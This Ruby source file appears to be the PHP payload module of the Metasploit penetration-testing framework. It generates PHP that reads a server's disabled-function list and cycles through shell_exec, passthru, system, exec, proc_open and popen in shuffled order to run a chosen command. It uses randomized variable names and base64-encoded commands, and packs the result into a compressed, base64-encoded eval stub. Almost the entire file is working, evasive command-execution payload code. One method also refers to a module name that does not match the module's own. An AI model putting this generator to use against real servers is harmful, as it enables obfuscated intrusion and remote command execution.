# -*- coding: binary -*-

###
#
###
module Msf::Payload::Php

  #
  # Generate a chunk of PHP code that should be eval'd before
  # #php_system_block.
  #
  # The generated code will initialize
  #
  # @option options [String] :disabled_varname PHP variable name in which to
  #   store an array of disabled functions.
  #
  # @return [String] A chunk of PHP code
  #
  def self.preamble(options = {})
    vars = options.fetch(:vars_generator) { Rex::RandomIdentifier::Generator.new(language: :php) }

    dis = options[:disabled_varname] || vars[:disabled_varname]
    dis = "$#{dis}" unless dis.start_with?('$')

    # Canonicalize the list of disabled functions to facilitate choosing a
    # system-like function later.
    <<~TEXT
      /*<?php /**/
      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
      #{dis}=@ini_get('disable_functions');
      if(!empty(#{dis})){
        #{dis}=preg_replace('/[, ]+/',',',#{dis});
        #{dis}=explode(',',#{dis});
        #{dis}=array_map('trim',#{dis});
      }else{
        #{dis}=array();
      }
    TEXT
  end

  def php_preamble(options = {})
    Msf::Payload::Php.preamble(options)
  end

  #
  # Generate a chunk of PHP code that tries to run a command.
  #
  # @option options [String] :cmd_varname PHP variable name containing the
  #   command to run
  # @option options [String] :disabled_varname PHP variable name containing
  #   an array of disabled functions. See #php_preamble
  # @option options [String] :output_varname PHP variable name in which to
  #   store the output of the command. Will contain 0 if no exec functions
  #   work.
  #
  # @return [String] A chunk of PHP code that, with a little luck, will run a
  #   command.
  #
  def self.system_block(options = {})
    vars = options.fetch(:vars_generator) { Rex::RandomIdentifier::Generator.new(language: :php) }

    cmd = options[:cmd_varname] || vars[:cmd_varname]
    dis = options[:disabled_varname] || vars[:disabled_varname]
    output = options[:output_varname] || vars[:output_varname]

    cmd    = '$' + cmd unless cmd.start_with?('$')
    dis    = '$' + dis unless dis.start_with?('$')
    output = '$' + output unless output.start_with?('$')

    is_callable = vars[:is_callable_varname]
    in_array    = vars[:in_array_varname]

    setup = ''
    if options[:cmd]
      setup << <<~TEXT
        #{cmd}=base64_decode('#{Rex::Text.encode_base64(options[:cmd])}');
      TEXT
    end
    setup << <<~TEXT
      if (FALSE!==stristr(PHP_OS,'win')){
        #{cmd}=#{cmd}.\" 2>&1\\n\";
      }
      #{is_callable}='is_callable';
      #{in_array}='in_array';
    TEXT
    shell_exec = <<~TEXT
      if(#{is_callable}('shell_exec')&&!#{in_array}('shell_exec',#{dis})){
        #{output}=`#{cmd}`;
      }else
    TEXT
    passthru = <<~TEXT
      if(#{is_callable}('passthru')&&!#{in_array}('passthru',#{dis})){
        ob_start();
        passthru(#{cmd});
        #{output}=ob_get_contents();
        ob_end_clean();
      }else
    TEXT
    system = <<~TEXT
      if(#{is_callable}('system')&&!#{in_array}('system',#{dis})){
        ob_start();
        system(#{cmd});
        #{output}=ob_get_contents();
        ob_end_clean();
      }else
    TEXT
    exec = <<~TEXT
      if(#{is_callable}('exec')&&!#{in_array}('exec',#{dis})){
        #{output}=array();
        exec(#{cmd},#{output});
        #{output}=join(chr(10),#{output}).chr(10);
      }else
    TEXT
    proc_open = <<~TEXT
      if(#{is_callable}('proc_open')&&!#{in_array}('proc_open',#{dis})){
        $handle=proc_open(#{cmd},array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        #{output}=NULL;
        while(!feof($pipes[1])){
          #{output}.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
    TEXT
    popen = <<~TEXT
      if(#{is_callable}('popen')&&!#{in_array}('popen',#{dis})){
        $fp=popen(#{cmd},'r');
        #{output}=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            #{output}.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
    TEXT
    # Currently unused until we can figure out how to get output with COM
    # objects (which are not subject to safe mode restrictions) instead of
    # PHP functions.
    #win32_com = "
    #	if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
    #		$wscript = new COM('Wscript.Shell');
    #		$wscript->run(#{cmd} . ' > %TEMP%\\out.txt');
    #		#{output} = file_get_contents('%TEMP%\\out.txt');
    #	}else"
    fail_block = <<~TEXT
      {
        #{output}=0;
      }
    TEXT

    exec_methods = [passthru, shell_exec, system, exec, proc_open, popen]
    exec_methods = exec_methods.shuffle
    setup + exec_methods.join("") + fail_block
  end

  def php_system_block(options = {})
    Msf::Payload::Php.system_block(options)
  end

  def php_exec_cmd(cmd)
    vars = Rex::RandomIdentifier::Generator.new(language: :php)
    <<-END_OF_PHP_CODE
      #{php_preamble(vars_generator: vars)}
      #{php_system_block(vars_generator: vars, cmd: cmd)}
    END_OF_PHP_CODE
  end

  def self.create_exec_stub(php_code, options = {})
    payload = Rex::Text.encode_base64(Rex::Text.zlib_deflate(php_code))
    b64_stub = "eval(gzuncompress(base64_decode('#{payload}')));"
    b64_stub = "<?php #{b64_stub} ?>" if options.fetch(:wrap_in_tags, true)
    b64_stub
  end

  def php_create_exec_stub(php_code)
    Msf::Payload::PHP.create_exec_stub(php_code)
  end

end
